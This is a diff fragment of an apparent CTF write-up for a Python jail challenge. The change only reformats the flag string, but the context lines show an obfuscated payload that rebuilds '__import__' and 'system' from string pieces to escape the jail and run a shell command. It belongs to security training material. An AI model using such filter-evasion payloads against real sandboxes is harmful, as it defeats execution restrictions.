@@ -69,7 +69,7 @@ run``
 ``(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('cat 
 flag.txt')``
 
-This bypasses the jail and prints the flag: CITU{th1s_1s_jus7_4n_ez_0n3_w4rd3n_1s_c4r3l3ss}
+This bypasses the jail and prints the flag: `CITU{th1s_1s_jus7_4n_ez_0n3_w4rd3n_1s_c4r3l3ss}`
 
 
 
